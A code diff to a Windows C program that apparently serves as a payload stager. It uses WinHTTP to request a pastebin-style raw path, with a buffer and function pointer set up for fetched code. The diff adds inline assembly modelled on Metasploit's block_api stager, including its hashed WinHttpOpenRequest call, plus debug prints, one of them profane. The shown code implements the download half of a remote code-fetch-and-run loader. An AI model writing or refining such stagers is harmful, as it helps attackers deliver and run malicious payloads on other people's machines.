@@ -20,6 +20,10 @@
 #include <winhttp.h>
 #include <wincrypt.h>
 
+//#include "block_api.s"
+
+//extern void api_call();
+
 /* a quick routine to quit and report why we quit */
 void punt(char * error) {
   printf("Bad things: %s\n", error);
@@ -28,6 +32,7 @@ void punt(char * error) {
 }
 
 int main(int argc, char * argv[]) {
+  printf("doing a thing...\n");
   BYTE * buffer;
   void (*function)();
   DWORD size;
@@ -47,7 +52,7 @@ int main(int argc, char * argv[]) {
                          WINHTTP_NO_PROXY_NAME,
                          WINHTTP_NO_PROXY_BYPASS, 0);
 
-  if(hRequest == NULL) {
+  if(hSession == NULL) {
     punt("could not open HTTP session\n");
   }
 
@@ -63,7 +68,7 @@ int main(int argc, char * argv[]) {
   hConnect = WinHttpConnect(hSession, host,
                           INTERNET_DEFAULT_HTTP_PORT, 0);
 
-  if(hRequest == NULL) {
+  if(hConnect == NULL) {
     punt("could not open HTTP connection\n");
     if (hSession) WinHttpCloseHandle(hSession);
   }
@@ -71,14 +76,64 @@ int main(int argc, char * argv[]) {
   /* send HTTP GET to target host */
   LPCWSTR path = L"/raw.php?i=PDg27FPb";
 
+  /*
+  xor ebx ebx            ; null out ebx
+  push HTTP_OPEN_FLAGS   ; Flags [7]
+  push ebx               ; AcceptTypes (NULL) [6]
+  push ebx               ; Referrer (NULL) [5]
+  push ebx               ; Version (NULL)  [4]
+  push edi               ; ObjectName (URI) [3]
+  push ebx               ; Verb (GET method) (NULL)  [2]
+  push eax               ; Connect handler returned by WinHttpConnect [1]
+  push 0x5BB31098        ; hash( "winhttp.dll", "WinHttpOpenRequest" )
+  call ebp
+  xchg esi, eax          ; save HttpRequest handler in esi
+  */
+
+  /*
+  xor %ebx %ebx           ; null out ebx
+  push HTTP_OPEN_FLAGS    ; Flags [7]
+  push %ebx               ; AcceptTypes (NULL) [6]
+  push %ebx               ; Referrer (NULL) [5]
+  push %ebx               ; Version (NULL)  [4]
+  push %edi               ; ObjectName (URI) [3]
+  push %ebx               ; Verb (GET method) (NULL)  [2]
+  push %eax               ; Connect handler returned by WinHttpConnect [1]
+  push $0x5BB31098        ; hash( "winhttp.dll", "WinHttpOpenRequest" )
+  call %ebp
+  xchg %eax, %esi         ; save HttpRequest handler in esi
+  */
+
+  printf("HERE WE GOOOOOOOOOOOOOOOOOOOOOOOOOOOO\n");
+  asm("xor %%ebx, %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %%ebx\n\t"
+  "push %[path]\n\t"
+  "push %%ebx\n\t"
+  "push %[hConnect]\n\t"
+  "call *%[function]\n\t"
+  //"push $0x5BB31098\n\t"
+  //"call *%[api_call]\n\t"
+  "xchg %%eax, %[hRequest]"
+  : [hRequest] "=r" (hRequest)
+  : [hConnect] "r" (hConnect),
+    [path] "r" (path),
+    [function] "r" (WinHttpOpenRequest)
+    //[api_call] "r" (api_call)
+  : "eax", "ebx", "ecx"
+  );
+  printf("HOLY FUCK WE OUT\n");
+
   // if (hConnect)
-  hRequest = WinHttpOpenRequest(hConnect,
+  /*hRequest = WinHttpOpenRequest(hConnect,
                                 L"GET",
                                 path,
                                 NULL,
                                 WINHTTP_NO_REFERER,
                                 WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                0);
+                                0);*/
 
   if(hRequest == NULL) {
     punt("could not open HTTP request\n");
